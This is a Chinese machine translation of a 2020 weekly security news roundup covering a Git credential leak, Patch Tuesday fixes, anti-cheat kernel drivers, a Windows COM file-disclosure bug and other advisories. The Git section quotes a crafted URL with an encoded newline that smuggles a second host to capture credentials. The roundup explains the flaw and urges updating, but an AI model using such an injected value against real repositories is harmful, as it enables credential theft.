# 本周的安全:Git、星期二补丁、反作弊和易受攻击的文档

> 原文：<https://hackaday.com/2020/04/17/this-week-in-security-git-patch-tuesday-anti-cheat-and-vulnerable-documentation/>

Git 周二发布了一个更新，修复了[一个可能导致凭据泄露的问题](https://www.phoronix.com/scan.php?page=news_item&px=Git-Newline-Leak-Vulnerability)。该漏洞存在于 Git 处理包含换行符的 HTTP URL 的方式中。查看 2.26.1 中的[，我们可以找到一个攻击的例子:
`url = "https://one.example.com?%0ahost=two.example.com/foo.git"`](https://github.com/gitster/git/commit/de49261b050d9cd8ec73842356077bc5b606640f)

因此，对这个存储库执行`git pull`会将您的 git 实例连接到攻击者的服务器，但是使用来自任意服务器的凭证。例如，这似乎有可能被用来窃取 Github 凭证。所以去确保你有一个更新的 Git 客户端。

### 商业 VPN 和开源

如今，商业 VPN 提供商多如牛毛，它们并不都是声誉卓著的。今天，我们不是在报道那些坏演员，而是在寻找一个做得好的供应商。IVPN 已经开源了他们的客户端软件，并完成了在 F-Droid 上托管他们的 Android 客户端所需的流程。顺便说一下，F-Droid 是一个开源的第三方 Android 应用商店。([查看我的 FLOSS 每周访谈了解更多信息](https://twit.tv/shows/floss-weekly/episodes/572)。)

![IVPN on F-droid](img/7b45751919a9fc7d05d7658eb245a4d8.png)

IVPN 甚至计划开源他们的服务器端软件。虽然拥有一个完全开源的堆栈并不能绝对保证一个提供者的良好行为，但它可以很好地证明良好的意图，并赢得大量的社区好感。

### 星期二补丁

还记得我们过去几周谈论的 Windows 0-days 吗？[补丁星期二终于来了](https://arstechnica.com/information-technology/2020/04/4-windows-0days-under-active-exploit-get-fixes-in-this-months-update-tuesday/)，三个被积极利用的漏洞终于得到修复。其中两个缺陷是用于渲染字体的 DLL 中的 rce，第三个是 Windows 内核中的本地权限提升缺陷。

Internet Explorer 中的另一个重要错误也在本周得到了修复: [CVE-2020-0968](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0968) 。这是一个远程执行错误，只需访问恶意页面即可触发。在一些地方，这被称为 0 天，但微软声称，他们没有发现它在野外被利用的证据。

最后一点相关消息是，被称为[SandboxEscaper] [的安全研究员现在在微软](https://krebsonsecurity.com/2020/04/microsoft-patch-tuesday-april-2020-edition/)工作，负责过去几个月修复的一些 bug。

### 反作弊

Riot Games 为他们最近发布的游戏 Valorant 推出了新的反作弊系统 Vanguard T1。Vanguard 显然吸引了一些注意力，因为它安装了一个内核级驱动程序作为反作弊措施的一部分。在某种程度上，一个真正强大的反作弊解决方案需要的不仅仅是用户级的系统访问，这是可以理解的。同时，该驱动程序中的漏洞意味着整个系统都暴露在外，更不用说故意不当行为的可能性了。

人们可以观察到，其他无处不在的反作弊解决方案，如 BattlEye 和 EAC，也使用内核驱动程序来运行。(结果是，通过 Wine 在 Linux 上运行游戏是一个巨大的障碍。)我无法证实这一点，但有消息称 Vanguard 是不同的，它总是加载，而不是只在游戏运行时加载。一个幽默的花絮是，反病毒应用程序倾向于将反作弊软件标记为恶意应用程序。

### Windows COM 漏洞和文档

这个漏洞并不特别可怕，而且已经存在几个月了，但是[文章刚刚发布，并且有一个非常有趣的问题](https://research.nccgroup.com/2020/04/15/cve-2019-1381-and-cve-2020-0859-how-misleading-documentation-led-to-a-broken-patch-for-a-windows-arbitrary-file-disclosure-vulnerability/)。首先，Windows 组件对象模型(COM)本质上只是 Windows API 的一部分。(我知道这在技术上不太正确，但对于我们的目的来说，这是一个有用的简化。nccgroup 的[菲利普·朗罗伊]和[爱德华·托金顿]发现了一个与程序安装相关的 COM 接口缺陷。通过创建符号链接，然后调用易受攻击的接口，低权限用户可以欺骗系统创建系统上任何文件的可读副本。

正如预期的那样，微软做出了响应，并在 90 天内推出了修复该问题的补丁。对供应商的补丁进行后续检查总是一个好主意，并且注意到了一些奇怪的事情——最初的漏洞利用仍然在打了补丁的机器上工作！经过一番反编译和反复检查，罪魁祸首竟然是一个 Windows 函数，“GetFileAttributesW”。对 MSDN 文档的快速检查表明，在符号链接的情况下，该函数返回关于链接而不是目标的信息。然而，在实践中，该函数跟踪链接并报告目标文件。

在追踪安全问题时，文档是非常重要的，不正确的文档会导致各种类似的麻烦。这也突出了通过实际运行代码进行双重检查的重要性，而不是仅仅依赖于你对问题的理解。最后，如果您报告了一个已被修复的安全漏洞，请务必再次访问该问题，以确保它确实已被修复！

### 零碎东西

一个 Juniper 虚拟路由器映像意外地[与根级证书](https://kb.juniper.net/InfoCenter/index?page=content&id=JSA10998)一起发货。虽然这显然是一个问题，但这并不像我们之前报道的一些故事那么糟糕。首先，这不是一个隐藏的或不可更改的密码，建议在初始设置时设置 root 密码。另一个区别是 Juniper 的研究人员自己发现了这个问题，并在没有任何滥用的情况下修复了它。另一方面，这些凭证已经在 Juniper 的虚拟机中存在了 3 年。

Firefox 75 已经发布，另一组错误正在修复。它们中没有一个是在野外发现的，但是有几个虫子被认为影响很大，很可能被利用。一个新的 Firefox ESR 版本也发布了，[修复了一些相同的错误](https://www.mozilla.org/en-US/security/advisories/mfsa2020-13/)。那次更新引发了[的尾巴更新](https://tails.boum.org/news/version_4.5/)和[的浏览器更新](https://blog.torproject.org/new-release-tor-browser-909)。

谷歌 Chrome 终于发布了他们的下一个版本，[跳转到 Chrome 81](https://chromereleases.googleblog.com/2020/04/stable-channel-update-for-desktop_7.html) 。这包含了 32 个安全补丁，其中一些是非常重要的补丁。

“[不要将您的管理界面连接到互联网](https://www.dell.com/support/article/en-us/sln320717/dsa-2020-063-idrac-buffer-overflow-vulnerability?lang=en)”中的下一个条目来自戴尔，因为他们的 iDRAC(集成戴尔远程访问控制器)刚刚更新，以修复一个严重的缓冲区溢出漏洞。该漏洞无需身份验证即可被利用，并可能被用来执行任意代码。

Zoom 就是找不到突破口，因为最新的消息是已经发现了两个漏洞，其中一个以 50 万美元的价格出售。这个漏洞是一个完整的 Windows RCE，而另一个是一个不太有用的 Mac only 缺陷。